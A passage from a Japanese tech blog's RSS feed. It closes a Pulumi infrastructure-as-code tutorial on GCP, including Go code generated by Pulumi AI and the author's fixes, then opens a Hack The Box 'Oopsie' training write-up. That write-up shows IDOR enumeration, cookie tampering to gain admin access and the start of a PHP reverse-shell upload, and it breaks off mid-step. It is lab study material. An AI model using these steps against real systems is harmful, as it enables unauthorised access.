class="line"> -   └─ gcp:storage:Bucket  my-bucket     deleted (1s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Outputs:</span><br><span class="line">  - ObjectName    : <span class="string">&quot;index.html-debb576&quot;</span></span><br><span class="line">  - bucketEndpoint: <span class="string">&quot;http://storage.googleapis.com/my-bucket-0cae339/index.html-debb576&quot;</span></span><br><span class="line">  - bucketName    : <span class="string">&quot;gs://my-bucket-0cae339&quot;</span></span><br><span class="line"></span><br><span class="line">Resources:</span><br><span class="line">    - 2 deleted</span><br><span class="line"></span><br><span class="line">Duration: 3s</span><br><span class="line"></span><br><span class="line">The resources <span class="keyword">in</span> the stack have been deleted, but the <span class="built_in">history</span> and configuration associated with the stack are still maintained.</span><br><span class="line">If you want to remove the stack completely, run `pulumi stack <span class="built_in">rm</span> dev`.</span><br></pre></td></tr></table></figure><p>無事削除されました。</p><img src="/images/20230426a/image_14.png" alt="" width="1200" height="624" loading="lazy"><p>スタック自体を削除するには、<code>pulumi stack rm</code>を実行します。このコマンドによりすべての更新履歴とともに、Pulumi Cloud からスタックが完全に削除されます。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ pulumi stack <span class="built_in">rm</span></span><br><span class="line">This will permanently remove the <span class="string">&#x27;dev&#x27;</span> stack!</span><br><span class="line">Please confirm that this is what you<span class="string">&#x27;d like to do by typing `dev`: dev</span></span><br><span class="line"><span class="string">Stack &#x27;</span>dev<span class="string">&#x27; has been removed!</span></span><br></pre></td></tr></table></figure><p>Pulumi Cloudを確認すると、dev stackが削除されていることが確認できました。<br><img src="/images/20230426a/image_15.png" alt="" width="1200" height="474" loading="lazy"></p><h1 id="外伝-Pulumi-AI"><a href="#外伝-Pulumi-AI" class="headerlink" title="[外伝] Pulumi AI"></a>[外伝] Pulumi AI</h1><p>ちょうど一週間ほど前に、自然言語からIaC（インフラ構成コード）を自動生成する「Pulumi AI」を含む、AIを活用した新サービス群「Pulumi Insights」が発表されました。<br>タイムリーな内容なので、本記事でも試してみたいと思います</p><p><a href="https://www.publickey1.jp/blog/23/pulumipulumi_aiawsazurecloudflarekubernetesdatadog130infra-as-code.html">https://www.publickey1.jp/blog/23/pulumipulumi_aiawsazurecloudflarekubernetesdatadog130infra-as-code.html</a></p><p><a href="https://www.pulumi.com/ai/">https://www.pulumi.com/ai/</a></p><h2 id="早速使ってみた。"><a href="#早速使ってみた。" class="headerlink" title="早速使ってみた。"></a>早速使ってみた。</h2><p>Pulumi AIの入力に以下の情報を渡してみました。日本語にも対応しています。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Create GCP Resource.</span><br><span class="line">・VPC and The CIDR of the subnet is 192.168.0.0/24 and the region uses us-central1.</span><br><span class="line">・Create a firewall that allows ssh with iap using the iap-ssh tag.</span><br><span class="line">・Build a GCE using ubuntu 20.04 using the FIrewall you just created.</span><br><span class="line">・Export of InstanceName</span><br></pre></td></tr></table></figure><p>上記の入力を与えたときには下記のようにPulumi AIが入力内容をもとにPulumiのGoのコードを生成していきます。（す、すごい。。。）</p><img src="/images/20230426a/ezgif.com-video-to-gif_(4).gif" alt="ezgif.com-video-to-gif_(4).gif" width="600" height="338" loading="lazy"><p>以下が、Pulumi AIによって生成されたコードになります。<br>きちんと作成するリソースごとにコメントアウトも入れてくれて助かります。</p><figure class="highlight go"><figcaption><span>Pulumi AIによって自動生成されたコード</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;github.com/pulumi/pulumi-gcp/sdk/v5/go/gcp/compute&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/pulumi/pulumi/sdk/v3/go/pulumi&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    pulumi.Run(<span class="function"><span class="keyword">func</span><span class="params">(ctx *pulumi.Context)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">        <span class="comment">// Create a GCP VPC network</span></span><br><span class="line">        vpc, err := compute.NewNetwork(ctx, <span class="string">&quot;my-vpc&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create a GCP subnet in the us-central1 region</span></span><br><span class="line">        subnet, err := compute.NewSubnetwork(ctx, <span class="string">&quot;my-subnet&quot;</span>, &amp;compute.SubnetworkArgs&#123;</span><br><span class="line">            Network: vpc.ID(),</span><br><span class="line">            Region:  pulumi.String(<span class="string">&quot;us-central1&quot;</span>),</span><br><span class="line">            IpCidrRange: pulumi.String(<span class="string">&quot;192.168.0.0/24&quot;</span>),</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create firewall rule</span></span><br><span class="line">        firewall, err := compute.NewFirewall(ctx, <span class="string">&quot;allow-ssh-with-iap&quot;</span>, &amp;compute.FirewallArgs&#123;</span><br><span class="line">            Network: vpc.ID(),</span><br><span class="line">            Allows: pulumi.StringArray&#123;</span><br><span class="line">                pulumi.String(<span class="string">&quot;tcp:22&quot;</span>),</span><br><span class="line">            &#125;,</span><br><span class="line">            SourceRanges: pulumi.StringArray&#123;</span><br><span class="line">                pulumi.String(<span class="string">&quot;35.235.240.0/20&quot;</span>),</span><br><span class="line">            &#125;,</span><br><span class="line">            TargetTags: pulumi.StringArray&#123;</span><br><span class="line">                pulumi.String(<span class="string">&quot;iap-ssh&quot;</span>),</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create GCE instance</span></span><br><span class="line">        instance, err := compute.NewInstance(ctx, <span class="string">&quot;my-instance&quot;</span>, &amp;compute.InstanceArgs&#123;</span><br><span class="line">            MachineType: pulumi.String(<span class="string">&quot;e2-small&quot;</span>),</span><br><span class="line">            BootDisk: &amp;compute.InstanceBootDiskArgs&#123;</span><br><span class="line">                InitializeParams: &amp;compute.InstanceBootDiskInitializeParamsArgs&#123;</span><br><span class="line">                    ImageFamily: pulumi.String(<span class="string">&quot;ubuntu-2004-lts&quot;</span>),</span><br><span class="line">                    ImageProject: pulumi.String(<span class="string">&quot;ubuntu-os-cloud&quot;</span>),</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;,</span><br><span class="line">            NetworkInterfaces: compute.InstanceNetworkInterfaceArray&#123;</span><br><span class="line">                &amp;compute.InstanceNetworkInterfaceArgs&#123;</span><br><span class="line">                    Subnetwork: subnet.ID(),</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;,</span><br><span class="line">            Tags: pulumi.StringArray&#123;</span><br><span class="line">                pulumi.String(<span class="string">&quot;iap-ssh&quot;</span>),</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Export InstanceName</span></span><br><span class="line">        ctx.Export(<span class="string">&quot;InstanceName&quot;</span>, instance.Name)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>とりあえず、脳死コピーをして<code>pulumi up</code>を実行すると下記のようにエラーになりました。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ pulumi up</span><br><span class="line">Previewing update (dev)</span><br><span class="line"></span><br><span class="line">View <span class="keyword">in</span> Browser (Ctrl+O): https://app.pulumi.com/xxxxxxxxxx/gcp-test/dev/previews/xxxxxxxxxx</span><br><span class="line"></span><br><span class="line">     Type                 Name          Plan     Info</span><br><span class="line">     pulumi:pulumi:Stack  gcp-test-dev           1 error; 5 messages</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Diagnostics:</span><br><span class="line">  pulumi:pulumi:Stack (gcp-test-dev):</span><br><span class="line">    <span class="comment"># gcp-test</span></span><br><span class="line">    ./main.go:27:9: firewall declared and not used</span><br><span class="line">    ./main.go:29:21: cannot use pulumi.StringArray&#123;…&#125; (value of <span class="built_in">type</span> pulumi.StringArray) as compute.FirewallAllowArrayInput value <span class="keyword">in</span> struct literal: pulumi.StringArray does not implement compute.FirewallAllowArrayInput (missing method ToFirewallAllowArrayOutput)</span><br><span class="line">    ./main.go:48:21: unknown field ImageFamily <span class="keyword">in</span> struct literal of <span class="built_in">type</span> compute.InstanceBootDiskInitializeParamsArgs</span><br><span class="line">    ./main.go:49:21: unknown field ImageProject <span class="keyword">in</span> struct literal of <span class="built_in">type</span> compute.InstanceBootDiskInitializeParamsArgs</span><br><span class="line"></span><br><span class="line">    error: error <span class="keyword">in</span> compiling Go: unable to run `go build`: <span class="built_in">exit</span> status 1</span><br></pre></td></tr></table></figure><p>GCE&#x2F;Firewallのgoの記載方法が誤っていそうなので<a href="https://www.pulumi.com/registry/packages/gcp/api-docs/compute/instance/">GCEについての公式ドキュメント</a>と<a href="https://www.pulumi.com/registry/packages/gcp/api-docs/compute/firewall/">Firewallについての公式ドキュメント</a>を確認し、エラーを修正します。</p><p>また、GCEを構築するゾーン指定が漏れていたので、48行目に追加します。</p><figure class="highlight go"><figcaption><span>修正後</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;github.com/pulumi/pulumi-gcp/sdk/v5/go/gcp/compute&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/pulumi/pulumi/sdk/v3/go/pulumi&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    pulumi.Run(<span class="function"><span class="keyword">func</span><span class="params">(ctx *pulumi.Context)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">        <span class="comment">// Create a GCP VPC network</span></span><br><span class="line">        vpc, err := compute.NewNetwork(ctx, <span class="string">&quot;my-vpc&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create a GCP subnet in the us-central1 region</span></span><br><span class="line">        subnet, err := compute.NewSubnetwork(ctx, <span class="string">&quot;my-subnet&quot;</span>, &amp;compute.SubnetworkArgs&#123;</span><br><span class="line">            Network: vpc.ID(),</span><br><span class="line">            Region:  pulumi.String(<span class="string">&quot;us-central1&quot;</span>),</span><br><span class="line">            IpCidrRange: pulumi.String(<span class="string">&quot;192.168.0.0/24&quot;</span>),</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create firewall rule</span></span><br><span class="line">        _, err = compute.NewFirewall(ctx, <span class="string">&quot;allow-ssh-with-iap&quot;</span>, &amp;compute.FirewallArgs&#123;</span><br><span class="line">            Network: vpc.ID(),</span><br><span class="line">Allows: compute.FirewallAllowArray&#123;</span><br><span class="line">&amp;compute.FirewallAllowArgs&#123;</span><br><span class="line">Protocol: pulumi.String(<span class="string">&quot;tcp&quot;</span>),</span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br><span class="line">            SourceRanges: pulumi.StringArray&#123;</span><br><span class="line">                pulumi.String(<span class="string">&quot;35.235.240.0/20&quot;</span>),</span><br><span class="line">            &#125;,</span><br><span class="line">            TargetTags: pulumi.StringArray&#123;</span><br><span class="line">                pulumi.String(<span class="string">&quot;iap-ssh&quot;</span>),</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create GCE instance</span></span><br><span class="line">        instance, err := compute.NewInstance(ctx, <span class="string">&quot;my-instance&quot;</span>, &amp;compute.InstanceArgs&#123;</span><br><span class="line">            MachineType: pulumi.String(<span class="string">&quot;e2-small&quot;</span>),</span><br><span class="line">Zone:        pulumi.String(<span class="string">&quot;us-central1-a&quot;</span>),</span><br><span class="line">            BootDisk: &amp;compute.InstanceBootDiskArgs&#123;</span><br><span class="line">                InitializeParams: &amp;compute.InstanceBootDiskInitializeParamsArgs&#123;</span><br><span class="line">                    Image: pulumi.String(<span class="string">&quot;ubuntu-2004-lts&quot;</span>),</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;,</span><br><span class="line">            NetworkInterfaces: compute.InstanceNetworkInterfaceArray&#123;</span><br><span class="line">                &amp;compute.InstanceNetworkInterfaceArgs&#123;</span><br><span class="line">                    Subnetwork: subnet.ID(),</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;,</span><br><span class="line">            Tags: pulumi.StringArray&#123;</span><br><span class="line">                pulumi.String(<span class="string">&quot;iap-ssh&quot;</span>),</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Export InstanceName</span></span><br><span class="line">        ctx.Export(<span class="string">&quot;InstanceName&quot;</span>, instance.Name)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修正後、再度<code>pulumi up</code>コマンドを実行し、yesをクリックします。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ pulumi up</span><br><span class="line">Previewing update (dev)</span><br><span class="line"></span><br><span class="line">View <span class="keyword">in</span> Browser (Ctrl+O): https://app.pulumi.com/xxxxxxxxxxxxx/gcp-test/dev/previews/xxxxxxxxxxxxx</span><br><span class="line"></span><br><span class="line">     Type                       Name                Plan</span><br><span class="line"> +   pulumi:pulumi:Stack        gcp-test-dev        create</span><br><span class="line"> +   ├─ gcp:compute:Network     my-vpc              create</span><br><span class="line"> +   ├─ gcp:compute:Subnetwork  my-subnet           create</span><br><span class="line"> +   ├─ gcp:compute:Firewall    allow-ssh-with-iap  create</span><br><span class="line"> +   └─ gcp:compute:Instance    my-instance         create</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Outputs:</span><br><span class="line">    InstanceName: <span class="string">&quot;my-instance-1e6164c&quot;</span></span><br><span class="line"></span><br><span class="line">Resources:</span><br><span class="line">    + 5 to create</span><br><span class="line"></span><br><span class="line">Do you want to perform this update?  [Use arrows to move, <span class="built_in">type</span> to filter]</span><br><span class="line">&gt; <span class="built_in">yes</span></span><br><span class="line">  no</span><br><span class="line">  details</span><br></pre></td></tr></table></figure><p>下記のように、成功しました。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Do you want to perform this update? <span class="built_in">yes</span></span><br><span class="line">Updating (dev)</span><br><span class="line"></span><br><span class="line">View <span class="keyword">in</span> Browser (Ctrl+O): https://app.pulumi.com/xxxxxxxxxxxxx/gcp-test/dev/updates/12</span><br><span class="line"></span><br><span class="line">     Type                       Name                Status</span><br><span class="line"> +   pulumi:pulumi:Stack        gcp-test-dev        created (76s)</span><br><span class="line"> +   ├─ gcp:compute:Network     my-vpc              created (43s)</span><br><span class="line"> +   ├─ gcp:compute:Subnetwork  my-subnet           created (14s)</span><br><span class="line"> +   ├─ gcp:compute:Firewall    allow-ssh-with-iap  created (12s)</span><br><span class="line"> +   └─ gcp:compute:Instance    my-instance         created (17s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Outputs:</span><br><span class="line">    InstanceName: <span class="string">&quot;my-instance-a5cb493&quot;</span></span><br><span class="line"></span><br><span class="line">Resources:</span><br><span class="line">    + 5 created</span><br><span class="line"></span><br><span class="line">Duration: 1m19s</span><br></pre></td></tr></table></figure><p>Google Cloudのマネジメントコンソールから「VMインスタンス」に作成されたVMインスタンスの「SSHボタン」をクリックします。</p><p>ブラウザがたちが上がり、しばらくすると無事にIAP経由でSSHできることを確認できました。</p><img src="/images/20230426a/image.jpg" alt="image.jpg" width="1200" height="841" loading="lazy"><h1 id="最後に"><a href="#最後に" class="headerlink" title="最後に"></a>最後に</h1><p>今回は、PulumiでのIaC入門について記載しました。</p><p>IaCはインフラリソースをコードで管理できるため、インフラリソースの迅速なデプロイや、品質の担保、オペミスの削減など様々なメリットがありますが、運用上のつらみもあるので利用するにはコードを管理するディレクトリ設計や、コーディング規約などを設けて利用していきましょう。</p><p>Pulumiにも入門してみましたが、いかがだったでしょうか。普段Terraformを利用している筆者からすると、アプリケーションコード(Go)を使用してインフラリソースが構築できるのは新鮮でした。普段アプリケーションコードを書いているアプリエンジニアからするとだいぶインフラリソースを構築するハードルが下がったのではと思います。</p><p>また、外伝としてPulumi AIにも触れてみましたが、入力する内容が良くなかったのか一発で<code>Pulumi up</code>を成功させることができなかったです。しかし、コンソールで対話型で構築したいインフラリソースを入力することでコードが自動生成されたるのは画期的だと思いました。まだまだ精度の問題はあるかと思いますが、いつかコードを自身で0から書かなくなる日もすぐそこなのだろうなと危機感を持ちました。</p><p>春の入門祭り2023、次回は小澤泰河さんの<a href="/articles/20230427a/">CDN 入門とエッジでのアプリケーション実行</a>です。</p>]]></content:encoded>
      
      
      <category domain="https://future-architect.github.io/categories/Infrastructure/">Infrastructure</category>
      
      
      <category domain="https://future-architect.github.io/tags/IaC/">IaC</category>
      
      <category domain="https://future-architect.github.io/tags/Pulumi/">Pulumi</category>
      
      <category domain="https://future-architect.github.io/tags/Infrastructure-as-Code/">Infrastructure as Code</category>
      
      
      <comments>https://future-architect.github.io/articles/20230426a/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Hack The Box Oopsie を解いてみた</title>
      <link>https://future-architect.github.io/articles/20230425a/</link>
      <guid>https://future-architect.github.io/articles/20230425a/</guid>
      <pubDate>Mon, 24 Apr 2023 15:00:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;はじめに&quot;&gt;&lt;a href=&quot;#はじめに&quot; class=&quot;headerlink&quot; title=&quot;はじめに&quot;&gt;&lt;/a&gt;はじめに&lt;/h2&gt;&lt;p&gt;金融グループ所属、2022年4月入社の藤戸四恩です。&lt;a</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="はじめに"><a href="#はじめに" class="headerlink" title="はじめに"></a>はじめに</h2><p>金融グループ所属、2022年4月入社の藤戸四恩です。<a href="/articles/20230417a/">春の入門ブログ連載</a>の7本目です。</p><p>2022年のアドベントカレンダーで<a href="https://qiita.com/fujito_shion/items/6a4475fc8784d2e77d4c">Hack The Boxのstarting pointを解いてみた</a>の記事を書きました。今回も「Hack The Box」のStarting PointのTIER2のOopsieを解いてみたので感想を書きたいと思います。</p><h2 id="Hack-The-Boxとは"><a href="#Hack-The-Boxとは" class="headerlink" title="Hack The Boxとは"></a>Hack The Boxとは</h2><p>Hack The Boxとは、サイバーセキュリティスキルの向上トレーニングができるオンラインプラットフォームです。</p><p>仮想の環境が用意されており、脆弱性をついてflagの取得を目的としています。</p><h2 id="Starting-Pointとは"><a href="#Starting-Pointとは" class="headerlink" title="Starting Pointとは"></a>Starting Pointとは</h2><p>Starting Pointとは、Hack The Boxを行う上での基礎的なことを学ぶことができる、チュートリアルです。Starting Pointには、TIER0、TIER1、TIER2の3つあります。各問題にTASKが複数あり、最後にflagを取るための誘導になっています。</p><h2 id="Oopsie"><a href="#Oopsie" class="headerlink" title="Oopsie"></a>Oopsie</h2><p>TIER2の問題から<code>root.txt</code>と<code>user.txt</code>の二つフラグを取得する必要があります。</p><p>問題はTASK1 ~ TASK10と<code>root.txt</code>と<code>user.txt</code>の中身を提出する12問から構成されています。</p><h3 id="TASK1"><a href="#TASK1" class="headerlink" title="TASK1"></a>TASK1</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">With what kind of tool can intercept web traffic?</span><br></pre></td></tr></table></figure><p>どのようなツールでWebトラフィックを傍受できるか?　と問われています。<br>こちらは、<code>proxy</code>と回答すればよいです。</p><h3 id="TASK2"><a href="#TASK2" class="headerlink" title="TASK2"></a>TASK2</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is the path to the directory on the webserver that returns a login page?</span><br></pre></td></tr></table></figure><p>ログインページを返す Web サーバー上のディレクトリへのパスは何ですか?　と問われています。</p><p><code>http://&#123;IPアドレス&#125;</code> にアクセスしBurp Suiteを使用しながらリクエストを眺めます。</p><p>内容は下図のようになります。</p><img src="/images/20230425a/image.png" alt="" width="1200" height="526" loading="lazy"><p><code>cdn-cgi/login</code> ディレクトリが存在しているのがわかるので、<code>http://&#123;IPアドレス&#125;/cdn-cgi/login</code> にアクセスしてみます。</p><img src="/images/20230425a/image_2.png" alt="" width="1200" height="889" loading="lazy"><p>Loginページを見つけることができました。</p><p>よって、<code>cdn-cgi/login</code>と回答すればよいです。</p><h3 id="TASK3-4"><a href="#TASK3-4" class="headerlink" title="TASK3, 4"></a>TASK3, 4</h3><p>TASK3の問題</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What can be modified in Firefox to get access to the upload page?</span><br></pre></td></tr></table></figure><p>TASK４の問題</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is the access ID of the admin user?`</span><br></pre></td></tr></table></figure><p>TASK3は、アップロードページにアクセスするには、Firefoxで何を変更できますか?と問われており、TASK４は、admin ユーザーのアクセスIDを問われています。TASK2のログインページでLogin as Guestのリンクがあるのでクリックしてみます。</p><img src="/images/20230425a/image_3.png" alt="" width="1200" height="690" loading="lazy"><p>ヘッダーのAccountをクリックしてみます。<br><img src="/images/20230425a/image_4.png" alt="" width="1200" height="690" loading="lazy"></p><p>URLが<code>http://&#123;IPアドレス&#125;/cdn-cgi/login/admin.php?content=accounts&amp;id=2</code>とguestの時idが2となっています。そこでid&#x3D;1にしてURLを叩いてみます。</p><img src="/images/20230425a/image_5.png" alt="" width="1200" height="686" loading="lazy"><p>adminユーザのIDがわかりました。</p><p>よって、TASK3の回答が<code>cookie</code>で、TASK4の回答が<code>34322</code>となります。</p><h3 id="TASK5"><a href="#TASK5" class="headerlink" title="TASK5"></a>TASK5</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">On uploading a file, what directory does that file appear in on the server?</span><br></pre></td></tr></table></figure><p>ファイルをアップロードすると、そのファイルはサーバー上のどのディレクトリに表示されますか?と問われています。</p><p>TASK3,4でadminユーザはID34322と分かったので、cookieのuserを34322、roleをadminに変更し、uploadsをクリックします。</p><img src="/images/20230425a/image_6.png" alt="" width="1200" height="743" loading="lazy"><p>ファイルをアップロードすると<code>The file &#123;ファイル名&#125; has been uploaded.</code>と表示されます。</p><p>gobusterをつかって、探索してみます。</p><img src="/images/20230425a/image_7.png" alt="" width="751" height="410" loading="lazy"><p><code>uploads</code>がありました。よって、回答は<code>uploads</code>です。また、ファイルをアップロードすると<code>uploads</code>配下にファイルが格納されそうと推測できます。</p><h3 id="TASK6"><a href="#TASK6" class="headerlink" title="TASK6"></a>TASK6</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is the file that contains the password that is shared with the robert user?</span><br></pre></td></tr></table></figure><p>robert ユーザーと共有されているパスワードを含むファイルは何ですか?と問われています。</p><p>実際にアクセスしてみます。</p><img src="/images/20230425a/image_8.png" alt="image.png" width="751" height="410" loading="lazy"><p>権限がないと怒られます。</p><p><a href="https://github.com/BlackArch/webshells">php-reverse-shell</a>をファイルアップロードして、reverse-shellを試みます。</p><img src="/images/20230425a/image_9.png" alt="" width="908" height="138" 